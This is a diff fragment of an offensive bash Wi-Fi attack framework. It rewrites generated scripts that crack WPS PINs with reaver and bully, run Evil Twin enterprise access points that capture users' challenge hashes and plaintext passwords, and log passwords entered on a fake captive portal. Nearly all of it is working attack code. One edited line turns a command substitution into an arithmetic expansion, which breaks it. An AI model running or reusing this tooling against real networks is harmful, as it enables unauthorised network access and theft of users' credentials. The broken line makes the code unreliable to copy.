@@ -10495,72 +10529,72 @@ function set_wps_attack_script() {
 				esac
 			fi
 
-			case ${script_wps_attack_mode} in
+			case "\${script_wps_attack_mode}" in
 				"pindb"|"custompin"|"nullpin")
-					for item in "${LINES_TO_PARSE[@]}"; do
-						if [ "${script_wps_attack_tool}" = "reaver" ]; then
-							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ "${pin_cracked}" -eq 1 ]]; then
-								if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
-									cracked_pin="${BASH_REMATCH[1]}"
+					for item in "\${LINES_TO_PARSE[@]}"; do
+						if [ "\${script_wps_attack_tool}" = "reaver" ]; then
+							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]] || [[ "\${pin_cracked}" -eq 1 ]]; then
+								if [[ "\${item}" =~ \${pin_cracked_regexp} ]]; then
+									cracked_pin="\${BASH_REMATCH[1]}"
 									continue
-								elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
-									cracked_password="${BASH_REMATCH[1]}"
+								elif [[ \${item} =~ \${password_cracked_regexp} ]]; then
+									cracked_password="\${BASH_REMATCH[1]}"
 									return 0
 								fi
 								pin_cracked=1
 								continue
-							elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
+							elif [[ "\${item}" =~ \${success_attack_badpin_regexp} ]]; then
 								return 2
-							elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
+							elif [[ "\${item}" =~ \${failed_attack_regexp} ]]; then
 								return 1
 							fi
 						else
-							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]]; then
-								cracked_pin="${BASH_REMATCH[1]}"
-								cracked_password="${BASH_REMATCH[2]}"
+							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]]; then
+								cracked_pin="\${BASH_REMATCH[1]}"
+								cracked_password="\${BASH_REMATCH[2]}"
 								pin_cracked=1
 								return 0
-							elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
+							elif [[ "\${item}" =~ \${failed_attack_regexp} ]]; then
 								return 1
-							elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
+							elif [[ "\${item}" =~ \${success_attack_badpin_regexp} ]]; then
 								return 2
 							fi
 						fi
 					done
 				;;
 				"pixiedust")
-					for item in "${LINES_TO_PARSE[@]}"; do
-						if [[ ${item} =~ ${success_attack_goodpixie_pin_regexp} ]]; then
-							cracked_pin="${BASH_REMATCH[4]}"
+					for item in "\${LINES_TO_PARSE[@]}"; do
+						if [[ "\${item}" =~ \${success_attack_goodpixie_pin_regexp} ]]; then
+							cracked_pin="\${BASH_REMATCH[4]}"
 							pin_cracked=1
 							continue
-						elif [[ ${item} =~ ${success_attack_goodpixie_password_regexp} ]]; then
-							cracked_password="${BASH_REMATCH[1]}"
+						elif [[ "\${item}" =~ \${success_attack_goodpixie_password_regexp} ]]; then
+							cracked_password="\${BASH_REMATCH[1]}"
 							return 0
 						fi
 					done
-					if [ "${pin_cracked}" -eq 1 ]; then
+					if [ "\${pin_cracked}" -eq 1 ]; then
 						return 0
 					fi
 				;;
 				"bruteforce")
-					for item in "${LINES_TO_PARSE[@]}"; do
-						if [ "${script_wps_attack_tool}" = "reaver" ]; then
-							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ "${pin_cracked}" -eq 1 ]]; then
-								if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
-									cracked_pin="${BASH_REMATCH[1]}"
+					for item in "\${LINES_TO_PARSE[@]}"; do
+						if [ "\${script_wps_attack_tool}" = "reaver" ]; then
+							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]] || [[ "\${pin_cracked}" -eq 1 ]]; then
+								if [[ "\${item}" =~ \${pin_cracked_regexp} ]]; then
+									cracked_pin="\${BASH_REMATCH[1]}"
 									continue
-								elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
-									cracked_password="${BASH_REMATCH[1]}"
+								elif [[ "\${item}" =~ \${password_cracked_regexp} ]]; then
+									cracked_password="\${BASH_REMATCH[1]}"
 									return 0
 								fi
 								pin_cracked=1
 								continue
 							fi
 						else
-							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]]; then
-								cracked_pin="${BASH_REMATCH[1]}"
-								cracked_password="${BASH_REMATCH[2]}"
+							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]]; then
+								cracked_pin="\${BASH_REMATCH[1]}"
+								cracked_password="\${BASH_REMATCH[2]}"
 								pin_cracked=1
 								return 0
 							fi
@@ -10570,55 +10604,39 @@ function set_wps_attack_script() {
 			esac
 			return 3
 		}
-	EOF
 
-	cat >&7 <<-EOF
 		#Prints message for pins on timeout
 		function print_timeout() {
 
 			echo
-	EOF
-
-	cat >&7 <<-'EOF'
-			if [ "${script_wps_attack_mode}" = "pixiedust" ]; then
-	EOF
-
-	cat >&7 <<-EOF
+			if [ "\${script_wps_attack_mode}" = "pixiedust" ]; then
 				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
-	EOF
-
-	cat >&7 <<-'EOF'
-			elif [ "${script_wps_attack_mode}" = "nullpin" ]; then
-	EOF
-
-	cat >&7 <<-EOF
+			elif [ "\${script_wps_attack_mode}" = "nullpin" ]; then
 				timeout_msg="${white_color}Timeout for null PIN${normal_color}"
 			else
 				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
 			fi
-	EOF
 
-	cat >&7 <<-'EOF'
-			echo -e "${timeout_msg}"
+			echo -e "\${timeout_msg}"
 		}
 
 		pin_cracked=0
 		this_pin_timeout=0
-		case ${script_wps_attack_mode} in
+		case \${script_wps_attack_mode} in
 			"pindb")
-				for current_pin in "${script_pins_found[@]}"; do
+				for current_pin in "\${script_pins_found[@]}"; do
 					possible_bully_timeout=0
-					if [ "${attack_pin_counter}" -ne 1 ]; then
+					if [ "\${attack_pin_counter}" -ne 1 ]; then
 						sleep 1.5
 					fi
 					bad_attack_this_pin_counter=0
-					if [ "${this_pin_timeout}" -eq 1 ]; then
+					if [ "\${this_pin_timeout}" -eq 1 ]; then
 						print_timeout
 					fi
 
 					echo
-					echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/${#script_pins_found[@]}${pin_header3}"
-					if [ "${script_wps_attack_tool}" = "bully" ]; then
+					echo -e "\${pin_header1}\${current_pin}\${pin_header2}\${attack_pin_counter}/\${#script_pins_found[@]}\${pin_header3}"
+					if [ "\${script_wps_attack_tool}" = "bully" ]; then
 						echo
 						clear_bully_session_files
 					else
@@ -10626,34 +10644,34 @@ function set_wps_attack_script() {
 					fi
 
 					this_pin_timeout=0
-					(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2} ${colorize}")
-					if [ "$?" = "124" ]; then
-						if [ "${script_wps_attack_tool}" = "reaver" ]; then
+					(set -o pipefail && eval "\${script_attack_cmd1}\${current_pin}\${script_attack_cmd2} \${colorize}")
+					if [ "\$?" = "124" ]; then
+						if [ "\${script_wps_attack_tool}" = "reaver" ]; then
 							this_pin_timeout=1
 						else
 							possible_bully_timeout=1
 						fi
 					fi
-					attack_pin_counter=$((attack_pin_counter + 1))
+					attack_pin_counter=\$((attack_pin_counter + 1))
 					parse_output
-					output="$?"
-					if [ "${output}" = "0" ]; then
+					output="\$?"
+					if [ "\${output}" = "0" ]; then
 						break
-					elif [ "${output}" = "1" ]; then
+					elif [ "\${output}" = "1" ]; then
 						this_pin_timeout=1
 						continue
-					elif [ "${output}" = "2" ]; then
+					elif [ "\${output}" = "2" ]; then
 						continue
-					elif [[ "${output}" = "3" ]] || [[ "${this_pin_timeout}" -eq 1 ]] || [[ "${possible_bully_timeout}" -eq 1 ]]; then
-						if [ "${this_pin_timeout}" -eq 1 ]; then
+					elif [[ "\${output}" = "3" ]] || [[ "\${this_pin_timeout}" -eq 1 ]] || [[ "\${possible_bully_timeout}" -eq 1 ]]; then
+						if [ "\${this_pin_timeout}" -eq 1 ]; then
 							continue
 						fi
-						bad_attack_this_pin_counter=$((bad_attack_this_pin_counter + 1))
-						if [ "${bad_attack_this_pin_counter}" -eq 3 ]; then
+						bad_attack_this_pin_counter=\$((bad_attack_this_pin_counter + 1))
+						if [ "\${bad_attack_this_pin_counter}" -eq 3 ]; then
 							this_pin_timeout=1
 							continue
 						fi
-						if [ "${possible_bully_timeout}" -eq 1 ]; then
+						if [ "\${possible_bully_timeout}" -eq 1 ]; then
 							this_pin_timeout=1
 							continue
 						fi
@@ -10663,17 +10681,17 @@ function set_wps_attack_script() {
 			"custompin")
 				possible_bully_timeout=0
 				echo
-				echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/1${pin_header3}"
-				if [ "${script_wps_attack_tool}" = "bully" ]; then
+				echo -e "\${pin_header1}\${current_pin}\${pin_header2}\${attack_pin_counter}/1\${pin_header3}"
+				if [ "\${script_wps_attack_tool}" = "bully" ]; then
 					echo
 					clear_bully_session_files
 				else
 					clear_reaver_session_files
 				fi
 
-				(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2} ${colorize}")
-				if [ "$?" = "124" ]; then
-					if [ "${script_wps_attack_tool}" = "reaver" ]; then
+				(set -o pipefail && eval "\${script_attack_cmd1}\${current_pin}\${script_attack_cmd2} \${colorize}")
+				if [ "\$?" = "124" ]; then
+					if [ "\${script_wps_attack_tool}" = "reaver" ]; then
 						this_pin_timeout=1
 					else
 						possible_bully_timeout=1
@@ -10681,13 +10699,13 @@ function set_wps_attack_script() {
 				fi
 
 				parse_output
-				output="$?"
-				if [[ "${output}" != "0" ]] && [[ "${output}" != "2" ]]; then
-					if [ "${this_pin_timeout}" -ne 1 ]; then
-						if [ "${output}" = "1" ]; then
+				output="\$?"
+				if [[ "\${output}" != "0" ]] && [[ "\${output}" != "2" ]]; then
+					if [ "\${this_pin_timeout}" -ne 1 ]; then
+						if [ "\${output}" = "1" ]; then
 							this_pin_timeout=1
-						elif [ "${possible_bully_timeout}" -eq 1 ]; then
-							if [ "${possible_bully_timeout}" -eq 1 ]; then
+						elif [ "\${possible_bully_timeout}" -eq 1 ]; then
+							if [ "\${possible_bully_timeout}" -eq 1 ]; then
 								this_pin_timeout=1
 							fi
 						fi
@@ -10696,66 +10714,59 @@ function set_wps_attack_script() {
 			;;
 			"pixiedust")
 				echo
-				echo -e "${pin_header1}"
-				if [ "${script_wps_attack_tool}" = "bully" ]; then
+				echo -e "\${pin_header1}"
+				if [ "\${script_wps_attack_tool}" = "bully" ]; then
 					echo
 					clear_bully_session_files
 				else
 					clear_reaver_session_files
 				fi
 
-				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}")
-				if [ "$?" = "124" ]; then
+				(set -o pipefail && eval "\${script_attack_cmd1}\${script_attack_cmd2} \${colorize}")
+				if [ "\$?" = "124" ]; then
 					this_pin_timeout=1
 				fi
 				parse_output
 			;;
 			"bruteforce")
 				echo
-				echo -e "${pin_header1}"
-				if [ "${script_wps_attack_tool}" = "bully" ]; then
+				echo -e "\${pin_header1}"
+				if [ "\${script_wps_attack_tool}" = "bully" ]; then
 					echo
 					clear_bully_session_files
 				else
 					clear_reaver_session_files
 				fi
-				eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}"
+				eval "\${script_attack_cmd1}\${script_attack_cmd2} \${colorize}"
 				parse_output
 			;;
 			"nullpin")
 				echo
-				echo -e "${pin_header1}"
-				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}")
-				if [ "$?" = "124" ]; then
+				echo -e "\${pin_header1}"
+				(set -o pipefail && eval "\${script_attack_cmd1}\${script_attack_cmd2} \${colorize}")
+				if [ "\$?" = "124" ]; then
 					this_pin_timeout=1
 				fi
 				parse_output
 			;;
 		esac
 
-		if [ "${pin_cracked}" -eq 1 ]; then
-	EOF
-
-	cat >&7 <<-EOF
+		if [ "\${pin_cracked}" -eq 1 ]; then
 			echo
 			pin_cracked_msg="${white_color}PIN cracked: ${yellow_color}"
 			password_cracked_msg="${white_color}Password cracked: ${yellow_color}"
 			password_not_cracked_msg="${white_color}Password was not cracked: ${yellow_color}Maybe because bad/low signal, or PBC activated on AP"
-	EOF
+			echo -e "\${pin_cracked_msg}\${cracked_pin}"
 
-	cat >&7 <<-'EOF'
-			echo -e "${pin_cracked_msg}${cracked_pin}"
-			if [ -n "${cracked_password}" ]; then
-				echo -e "${password_cracked_msg}${cracked_password}"
-				manage_wps_pot "${cracked_password}" "${cracked_pin}"
+			if [ -n "\${cracked_password}" ]; then
+				echo -e "\${password_cracked_msg}\${cracked_password}"
+				manage_wps_pot "\${cracked_password}" "\${cracked_pin}"
 			else
-				echo -e "${password_not_cracked_msg}"
+				echo -e "\${password_not_cracked_msg}"
 			fi
 		fi
 
-		if [ "${this_pin_timeout}" -eq 1 ]; then
-	EOF
-	cat >&7 <<-EOF
+		if [ "\${this_pin_timeout}" -eq 1 ]; then
 			print_timeout
 		fi
 
@@ -10784,6 +10795,7 @@ function set_enterprise_control_script() {
 
 	cat >&7 <<-EOF
 		#!/usr/bin/env bash
+
 		interface="${interface}"
 		et_initial_state="${et_initial_state}"
 		interface_airmon_compatible=${interface_airmon_compatible}
@@ -10797,9 +10809,7 @@ function set_enterprise_control_script() {
 		success_file="${tmpdir}${enterprisedir}${enterprise_successfile}"
 		done_msg="${yellow_color}${enterprise_texts[${language},9]}${normal_color}"
 		log_reminder_msg="${pink_color}${enterprise_texts[${language},10]}: [${normal_color}${enterprise_completepath}${pink_color}]${normal_color}"
-	EOF
 
-	cat >&7 <<-'EOF'
 		#Restore interface to its original state
 		function restore_interface() {
 
@@ -10807,27 +10817,27 @@ function set_enterprise_control_script() {
 				rfkill unblock all > /dev/null 2>&1
 			fi
 
-			iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1
+			iw dev "\${iface_monitor_et_deauth}" del > /dev/null 2>&1
 
-			if [ "${et_initial_state}" = "Managed" ]; then
-				ip link set "${interface}" down > /dev/null 2>&1
-				iw "${interface}" set type managed > /dev/null 2>&1
-				ip link set "${interface}" up > /dev/null 2>&1
+			if [ "\${et_initial_state}" = "Managed" ]; then
+				ip link set "\${interface}" down > /dev/null 2>&1
+				iw "\${interface}" set type managed > /dev/null 2>&1
+				ip link set "\${interface}" up > /dev/null 2>&1
 				ifacemode="Managed"
 			else
-				if [ "${interface_airmon_compatible}" -eq 1 ]; then
-					new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
+				if [ "\${interface_airmon_compatible}" -eq 1 ]; then
+					new_interface=\$(\${airmon} start "\${interface}" 2> /dev/null | grep monitor)
 
-					[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
-					if [ "${interface}" != "${new_interface}" ]; then
-						interface=${new_interface}
-						phy_interface=$(basename "$(readlink "/sys/class/net/${interface}/phy80211")" 2> /dev/null)
-						current_iface_on_messages="${interface}"
+					[[ \${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="\${BASH_REMATCH[1]}"
+					if [ "\${interface}" != "\${new_interface}" ]; then
+						interface=\${new_interface}
+						phy_interface=\$(basename "\$(readlink "/sys/class/net/\${interface}/phy80211")" 2> /dev/null)
+						current_iface_on_messages="\${interface}"
 					fi
 				else
-					ip link set "${interface}" down > /dev/null 2>&1
-					iw "${interface}" set monitor control > /dev/null 2>&1
-					ip link set "${interface}" up > /dev/null 2>&1
+					ip link set "\${interface}" down > /dev/null 2>&1
+					iw "\${interface}" set monitor control > /dev/null 2>&1
+					ip link set "\${interface}" up > /dev/null 2>&1
 				fi
 				ifacemode="Monitor"
 			fi
@@ -10836,11 +10846,11 @@ function set_enterprise_control_script() {
 		#Save some vars to a file to get read from main script
 		function save_returning_vars_to_file() {
 			{
-			echo -e "interface=${interface}"
-			echo -e "phy_interface=${phy_interface}"
-			echo -e "current_iface_on_messages=${current_iface_on_messages}"
-			echo -e "ifacemode=${ifacemode}"
-			} > "${enterprise_returning_vars_file}"
+			echo -e "interface=\${interface}"
+			echo -e "phy_interface=\${phy_interface}"
+			echo -e "current_iface_on_messages=\${current_iface_on_messages}"
+			echo -e "ifacemode=\${ifacemode}"
+			} > "\${enterprise_returning_vars_file}"
 		}
 	EOF
 
@@ -10868,13 +10878,13 @@ function set_enterprise_control_script() {
 		EOF
 	fi
 
-	cat >&7 <<-'EOF'
+	cat >&7 <<-EOF
 		#Kill Evil Twin Enterprise processes
 		function kill_enterprise_windows() {
 
-			readarray -t ENTERPRISE_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
-			for item in "${ENTERPRISE_PROCESSES_TO_KILL[@]}"; do
-				kill "${item}" &> /dev/null
+			readarray -t ENTERPRISE_PROCESSES_TO_KILL < <(cat < "\${path_to_processes}" 2> /dev/null)
+			for item in "\${ENTERPRISE_PROCESSES_TO_KILL[@]}"; do
+				kill "\${item}" &> /dev/null
 			done
 		}
 
@@ -10883,28 +10893,28 @@ function set_enterprise_control_script() {
 
 			local hash_captured=0
 			local plaintext_password_captured=0
-			readarray -t ENTERPRISE_LINES_TO_PARSE < <(cat < "${wpe_logfile}" 2> /dev/null)
-			for item in "${ENTERPRISE_LINES_TO_PARSE[@]}"; do
+			readarray -t ENTERPRISE_LINES_TO_PARSE < <(cat < "\${wpe_logfile}" 2> /dev/null)
+			for item in "\${ENTERPRISE_LINES_TO_PARSE[@]}"; do
 
-				if [[ "${item}" =~ challenge: ]]; then
+				if [[ "\${item}" =~ challenge: ]]; then
 					hash_captured=1
-				elif [[ "${item}" =~ password: ]]; then
+				elif [[ "\${item}" =~ password: ]]; then
 					plaintext_password_captured=1
 				fi
 			done
 
-			if [[ "${hash_captured}" -eq 1 ]] || [[ "${plaintext_password_captured}" -eq 1 ]]; then
-				touch "${success_file}" > /dev/null 2>&1
+			if [[ "\${hash_captured}" -eq 1 ]] || [[ "\${plaintext_password_captured}" -eq 1 ]]; then
+				touch "\${success_file}" > /dev/null 2>&1
 			fi
 
-			if [[ "${hash_captured}" -eq 1 ]] && [[ "${plaintext_password_captured}" -eq 0 ]]; then
-				echo 0 > "${success_file}" 2> /dev/null
+			if [[ "\${hash_captured}" -eq 1 ]] && [[ "\${plaintext_password_captured}" -eq 0 ]]; then
+				echo 0 > "\${success_file}" 2> /dev/null
 				return 0
-			elif [[ "${hash_captured}" -eq 0 ]] && [[ "${plaintext_password_captured}" -eq 1 ]]; then
-				echo 1 > "${success_file}" 2> /dev/null
+			elif [[ "\${hash_captured}" -eq 0 ]] && [[ "\${plaintext_password_captured}" -eq 1 ]]; then
+				echo 1 > "\${success_file}" 2> /dev/null
 				return 0
-			elif [[ "${hash_captured}" -eq 1 ]] && [[ "${plaintext_password_captured}" -eq 1 ]]; then
-				echo 2 > "${success_file}" 2> /dev/null
+			elif [[ "\${hash_captured}" -eq 1 ]] && [[ "\${plaintext_password_captured}" -eq 1 ]]; then
+				echo 2 > "\${success_file}" 2> /dev/null
 				return 0
 			fi
 
@@ -10912,26 +10922,26 @@ function set_enterprise_control_script() {
 		}
 
 		#Set captured hashes and passwords counters
+		#shellcheck disable=SC2155
 		function set_captured_counters() {
 
-			local new_username_found=0
 			declare -A lines_and_usernames
 
-			readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${wpe_logfile}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
-			for item in "${CAPTURED_USERNAMES[@]}"; do
-				[[ ${item} =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
-				lines_and_usernames["${username}"]="${line_number}"
+			readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "\${wpe_logfile}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
+			for item in "\${CAPTURED_USERNAMES[@]}"; do
+				[[ \${item} =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="\${BASH_REMATCH[1]}" && username="\${BASH_REMATCH[2]}"
+				lines_and_usernames["\${username}"]="\${line_number}"
 			done
 
 			hashes_counter=0
 			plaintext_pass_counter=0
-			for item2 in "${lines_and_usernames[@]}"; do
-				local line_to_check=$((item2 + 1))
-				local text_to_check=$(sed "${line_to_check}q;d" "${wpe_logfile}" 2> /dev/null)
-				if [[ "${text_to_check}" =~ challenge: ]]; then
-					hashes_counter=$((hashes_counter + 1))
-				elif [[ "${text_to_check}" =~ password: ]]; then
-					plaintext_pass_counter=$((plaintext_pass_counter + 1))
+			for item2 in "\${lines_and_usernames[@]}"; do
+				local line_to_check=\$((item2 + 1))
+				local text_to_check=\$(sed "\${line_to_check}q;d" "\${wpe_logfile}" 2> /dev/null)
+				if [[ "\${text_to_check}" =~ challenge: ]]; then
+					hashes_counter=\$((hashes_counter + 1))
+				elif [[ "\${text_to_check}" =~ password: ]]; then
+					plaintext_pass_counter=\$((plaintext_pass_counter + 1))
 				fi
 			done
 		}
@@ -10939,49 +10949,35 @@ function set_enterprise_control_script() {
 		#Get last captured username
 		function get_last_username() {
 
-			line_with_last_user=$(grep -E "username:" "${wpe_logfile}" | tail -1)
-			[[ ${line_with_last_user} =~ username:[[:blank:]]+(.*) ]] && last_username="${BASH_REMATCH[1]}"
+			line_with_last_user=\$(grep -E "username:" "\${wpe_logfile}" | tail -1)
+			[[ \${line_with_last_user} =~ username:[[:blank:]]+(.*) ]] && last_username="\${BASH_REMATCH[1]}"
 		}
-	EOF
 
-	cat >&7 <<-'EOF'
-
-		date_counter=$(date +%s)
+		date_counter=\$(date +%s)
 		last_username=""
 		break_on_next_loop=0
 		while true; do
-			et_control_window_channel=$(cat "${path_to_channelfile}" 2> /dev/null)
-			if [ "${break_on_next_loop}" -eq 1 ]; then
+			et_control_window_channel=\$(cat "\${path_to_channelfile}" 2> /dev/null)
+			if [ "\${break_on_next_loop}" -eq 1 ]; then
 				tput ed
 			fi
-	EOF
 
-	cat >&7 <<-EOF
 			echo -e "\t${yellow_color}${enterprise_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${enterprise_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
 			echo
 			echo -e "\t${green_color}${enterprise_texts[${language},2]}${normal_color}"
-	EOF
 
-	cat >&7 <<-'EOF'
-			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
-			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
-			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
-			echo -e "\t${hours}:${mins}:${secs}"
+			hours=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%H)
+			mins=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%M)
+			secs=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%S)
+			echo -e "\t\${hours}:\${mins}:\${secs}"
 
-			if [ "${break_on_next_loop}" -eq 0 ]; then
-	EOF
-
-	cat >&7 <<-EOF
+			if [ "\${break_on_next_loop}" -eq 0 ]; then
+				#shellcheck disable=SC2140
 				echo -e "\t${pink_color}${control_msg}${normal_color}\n"
 			fi
-	EOF
 
-	cat >&7 <<-'EOF'
 			echo
-			if [ -z "${last_username}" ]; then
-	EOF
-
-	cat >&7 <<-EOF
+			if [ -z "\${last_username}" ]; then
 				echo -e "\t${blue_color}${enterprise_texts[${language},6]}${normal_color}"
 				echo -e "\t${blue_color}${enterprise_texts[${language},7]}${normal_color}: 0"
 				echo -e "\t${blue_color}${enterprise_texts[${language},8]}${normal_color}: 0"
@@ -10989,15 +10985,12 @@ function set_enterprise_control_script() {
 				last_name_to_print="${blue_color}${enterprise_texts[${language},5]}:${normal_color}"
 				hashes_counter_message="${blue_color}${enterprise_texts[${language},7]}:${normal_color}"
 				plaintext_pass_counter_message="${blue_color}${enterprise_texts[${language},8]}:${normal_color}"
-	EOF
-
-	cat >&7 <<-'EOF'
-				tput el && echo -e "\t${last_name_to_print} ${last_username}"
-				echo -e "\t${hashes_counter_message} ${hashes_counter}"
-				echo -e "\t${plaintext_pass_counter_message} ${plaintext_pass_counter}"
+				tput el && echo -e "\t\${last_name_to_print} \${last_username}"
+				echo -e "\t\${hashes_counter_message} \${hashes_counter}"
+				echo -e "\t\${plaintext_pass_counter_message} \${plaintext_pass_counter}"
 			fi
 
-			if [ "${break_on_next_loop}" -eq 1 ]; then
+			if [ "\${break_on_next_loop}" -eq 1 ]; then
 				kill_enterprise_windows
 	EOF
 
@@ -11007,34 +11000,34 @@ function set_enterprise_control_script() {
 		EOF
 	fi
 
-	cat >&7 <<-'EOF'
+	cat >&7 <<-EOF
 				break
 			fi
 
 			if check_captured; then
 				get_last_username
 				set_captured_counters
-			 	if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+			 	if [ "\${enterprise_heredoc_mode}" = "smooth" ]; then
 					break_on_next_loop=1
 				fi
 			fi
 
 			echo -ne "\033[K\033[u"
 			sleep 0.3
-			current_window_size="$(tput cols)x$(tput lines)"
-			if [ "${current_window_size}" != "${stored_window_size}" ]; then
-				stored_window_size="${current_window_size}"
+			current_window_size="\$(tput cols)x\$(tput lines)"
+			if [ "\${current_window_size}" != "\${stored_window_size}" ]; then
+				stored_window_size="\${current_window_size}"
 				clear
 			fi
 		done
 
-		if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+		if [ "\${enterprise_heredoc_mode}" = "smooth" ]; then
 			echo
-			echo -e "\t${log_reminder_msg}"
+			echo -e "\t\${log_reminder_msg}"
 			echo
-			echo -e "\t${done_msg}"
+			echo -e "\t\${done_msg}"
 
-			if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+			if [ "\${enterprise_heredoc_mode}" = "smooth" ]; then
 				restore_interface
 				save_returning_vars_to_file
 			fi
@@ -11058,45 +11051,42 @@ function set_et_control_script() {
 
 	cat >&7 <<-EOF
 		#!/usr/bin/env bash
+
 		et_heredoc_mode="${et_mode}"
 		path_to_processes="${tmpdir}${et_processesfile}"
 		path_to_channelfile="${tmpdir}${channelfile}"
-		mdk_command="${mdk_command}"
-	EOF
+		right_arping="${right_arping}"
 
-	cat >&7 <<-'EOF'
-
+		#Kill a given PID and all its subprocesses recursively
 		function kill_pid_and_children_recursive() {
 
 			local parent_pid=""
 			local child_pids=""
 
-			parent_pid="${1}"
-			child_pids=$(pgrep -P "${parent_pid}" 2> /dev/null)
+			parent_pid="\${1}"
+			child_pids=\$(pgrep -P "\${parent_pid}" 2> /dev/null)
 
-			for child_pid in ${child_pids}; do
-				kill_pid_and_children_recursive "${child_pid}"
+			for child_pid in \${child_pids}; do
+				kill_pid_and_children_recursive "\${child_pid}"
 			done
-			if [ -n "${child_pids}" ]; then
-				pkill -P "${parent_pid}" &> /dev/null
+			if [ -n "\${child_pids}" ]; then
+				pkill -P "\${parent_pid}" &> /dev/null
 			fi
 
-			kill "${parent_pid}" &> /dev/null
-			wait "${parent_pid}" 2> /dev/null
+			kill "\${parent_pid}" &> /dev/null
+			wait "\${parent_pid}" 2> /dev/null
 		}
 
+		#Kill all the related processes
 		function kill_et_processes_control_script() {
 
-			readarray -t ET_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
-			for item in "${ET_PROCESSES_TO_KILL[@]}"; do
-				kill_pid_and_children_recursive "${item}"
+			readarray -t ET_PROCESSES_TO_KILL < <(cat < "\${path_to_processes}" 2> /dev/null)
+			for item in "\${ET_PROCESSES_TO_KILL[@]}"; do
+				kill_pid_and_children_recursive "\${item}"
 			done
 		}
 
-		if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
-	EOF
-
-	cat >&7 <<-EOF
+		if [ "\${et_heredoc_mode}" = "et_captive_portal" ]; then
 			attempts_path="${tmpdir}${webdir}${attemptsfile}"
 			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
 			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
@@ -11127,17 +11117,12 @@ function set_et_control_script() {
 	fi
 
 	cat >&7 <<-EOF
+			#Handle the finish of the Evil Twin attack
+			#shellcheck disable=SC1102
 			function finish_evil_twin() {
 
 				echo "" > "${et_captive_portal_logpath}"
-	EOF
-
-	cat >&7 <<-'EOF'
-				date +%Y-%m-%d >>\
-	EOF
-
-	cat >&7 <<-EOF
-				"${et_captive_portal_logpath}"
+				date +%Y-%m-%d >> "${et_captive_portal_logpath}"
 				{
 				echo "${et_misc_texts[${language},19]}"
 				echo ""
@@ -11148,6 +11133,7 @@ function set_et_control_script() {
 				echo "---------------"
 				echo ""
 				} >> "${et_captive_portal_logpath}"
+
 				success_pass_path="${tmpdir}${webdir}${currentpassfile}"
 				msg_good_pass="${et_misc_texts[${language},11]}:"
 				log_path="${et_captive_portal_logpath}"
@@ -11155,21 +11141,16 @@ function set_et_control_script() {
 				done_msg="${yellow_color}${et_misc_texts[${language},25]}${normal_color}"
 				echo -e "\t${blue_color}${et_misc_texts[${language},23]}:${normal_color}"
 				echo
-	EOF
-
-	cat >&7 <<-'EOF'
-				echo "${msg_good_pass} $( (cat < ${success_pass_path}) 2> /dev/null)" >> "${log_path}"
-				attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
-				et_password=$( (cat < ${success_pass_path}) 2> /dev/null)
-				echo -e "\t${et_password}"
+				echo "\${msg_good_pass} \$((cat < \${success_pass_path}) 2> /dev/null)" >> "\${log_path}"
+				attempts_number=\$((cat < "\${attempts_path}" | wc -l) 2> /dev/null)
+				et_password=\$((cat < \${success_pass_path}) 2> /dev/null)
+				echo -e "\t\${et_password}"
 				echo
-				echo -e "\t${log_reminder_msg}"
+				echo -e "\t\${log_reminder_msg}"
 				echo
-				echo -e "\t${done_msg}"
-				if [ "${attempts_number}" -gt 0 ]; then
-	EOF
